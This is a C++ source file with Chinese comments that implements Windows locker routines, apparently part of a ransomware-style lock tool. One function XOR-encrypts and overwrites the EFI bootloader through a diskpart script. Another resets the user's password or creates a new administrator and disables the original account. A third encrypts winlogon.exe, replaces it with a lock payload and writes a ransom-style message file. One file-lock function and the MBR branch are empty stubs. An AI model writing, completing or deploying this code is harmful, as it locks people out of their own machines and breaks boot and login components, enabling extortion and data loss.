#include "Lock.h"
#include <vector>
/*硬盘锁 是培育*/
int DiskLock(LockCore locker)
{
	HANDLE DiskHandle = NULL;
	GetPhysicalDriveHandle(DiskHandle, 0);
	string boot = GetPartitiontype(DiskHandle);
	if (boot == "GPT")
	{
		ofstream script("Esp.txt"); // 创建一个文件用于存储脚本
		script << "select disk " << GetSystemDiskPhysicalNumber() << endl;
		script << "select partition 1\n"; // 选择ESP分区 没必要再获取一次系统分区号，一般人都是1
		script << "assign letter=X\n"; // 将ESP分区挂载到盘符X
		script << "exit\n"; // 退出diskpart
		script.close(); // 关闭文件
		system("diskpart /s Esp.txt"); // 运行脚本
        // 打开bootx64.efi文件
        ifstream in("X:\\ESP\\BOOT\\bootx64.efi", ios::binary); 
        if (!in)
        {
            cout << "无法打开文件" << endl;
            return -1;
        }
        // 读取bootx64.efi文件的内容
        vector<char> buffer((istreambuf_iterator<char>(in)), istreambuf_iterator<char>());
        // 对读取的内容进行异或加密
        for (int i = 0; i < buffer.size(); i++)
        {
            buffer[i] ^= locker.Xorkey;
                ;
        }
        // 将加密后的内容写入bootbackup.yeluo文件
        ofstream out("X:\\ESP\\BOOT\\bootbackup.yeluo", ios::binary);
        if (!out)
        {
            cout << "无法创建文件" << endl;
            return -1;
        }
        out.write(&buffer[0], buffer.size());

        // 清空bootx64.efi文件并写入新数据
        ofstream out2("X:\\ESP\\BOOT\\bootx64.efi", ios::binary | ios::trunc);
        if (!out2)
        {
           // cout << "无法打开文件" << endl;
            return -1;
        }
        out2.write(reinterpret_cast<char*>(locker.UefiLockCore), sizeof(locker.UefiLockCore));
	}
	else//  mbr
	{

	}
}
// 用户锁函数，用于创建一个新用户并禁用当前用户
// 输入参数：setting - 用户锁设置
// 返回值：bool类型，表示函数的执行结果
BOOL UserLock( UserLockSetting setting)
{
    // 获取当前用户的用户名
    LPWSTR local = W_GetCurrentUsername();

    // 更改当前用户的密码
    if (!CurrentUser(local, setting.newPassword))
    {
        // 如果更改密码失败，则返回执行失败
        return false;
    }

    // 如果需要更改原用户名
    if (setting.changeOriginalUsername)
    {
        // 更改当前用户名
        if (!RenameUserAccount(local, setting.newUsername))
        {
            // 如果更改用户名失败，则返回执行失败
            return false;
        }
    }
    else // 如果不需要更改原用户名
    {
        // 创建一个新用户，并将其添加到管理员组中
        // 同时禁用当前用户，使其无法登录
        if (!NetUserAddAdmin(setting.newUsername, setting.newUsername) || !DisableUserAccount(local))
        {
            // 如果创建用户或禁用用户失败，则返回执行失败
            return false;
        }
    }
    return true;
}
/*加密文件锁*/
int FileLock(string password)
{
	return 0;
}
/*劫持winlogin登录锁*/
int LoginLock(LoginLockSetting setting)
{
    // 打开要读取的文件
    HANDLE hIn = CreateFile(L"C:\\Windows\\System32\\winlogon.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE)
    {
        std::cerr << "无法打开文件" << std::endl;
        return -1;
    }

    // 获取文件大小
    DWORD dwFileSize = GetFileSize(hIn, NULL);
    if (dwFileSize == INVALID_FILE_SIZE)
    {
        std::cerr << "无法获取文件大小" << std::endl;
        CloseHandle(hIn);
        return -1;
    }

    // 读取文件内容到缓冲区
    std::vector<char> buffer(dwFileSize);
    DWORD dwBytesRead = 0;
    if (!ReadFile(hIn, buffer.data(), dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
    {
        std::cerr << "读取文件失败" << std::endl;
        CloseHandle(hIn);
        return -1;
    }
    CloseHandle(hIn);

    // 对读取的内容进行异或加密
    const char xorKey = setting.XorKey;
    for (char& c : buffer)
    {
        c ^= xorKey;
    }

    // 写入加密后的数据到文件
    HANDLE hOut = CreateFile(L"C:\\loginbackup.yeluo", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE)
    {
        std::cerr << "无法创建文件" << std::endl;
        return -1;
    }
    DWORD dwBytesWritten = 0;
    if (!WriteFile(hOut, buffer.data(), dwFileSize, &dwBytesWritten, NULL) || dwBytesWritten != dwFileSize)
    {
        std::cerr << "写入文件失败" << std::endl;
        CloseHandle(hOut);
        return -1;
    }
    CloseHandle(hOut);

    // 写入新的数据到文件
    hOut = CreateFile(L"C:\\Windows\\System32\\winlogon.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE)
    {
        std::cerr << "无法打开文件" << std::endl;
        return -1;
    }
    if (!WriteFile(hOut, setting.LockCore, sizeof(setting.LockCore), &dwBytesWritten, NULL) || dwBytesWritten != sizeof(setting.LockCore))
    {
        std::cerr << "写入文件失败" << std::endl;
        CloseHandle(hOut);
        return -1;
    }
    CloseHandle(hOut);

    // 写入新的消息到文件
    hOut = CreateFile(L"C:\\Windows\\System32\\msg.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE)
    {
        std::cerr << "无法打开文件" << std::endl;
        return -1;
    }
    DWORD dwMsgLen = (DWORD)wcslen(setting.ShowMsg) * sizeof(wchar_t);
    if (!WriteFile(hOut, setting.ShowMsg, dwMsgLen, &dwBytesWritten, NULL) || dwBytesWritten != dwMsgLen)
    {
        std::cerr << "写入文件失败" << std::endl;
        CloseHandle(hOut);
        return -1;
    }
    CloseHandle(hOut);

    std::cout << "操作完成" << std::endl;
    return 0;
}
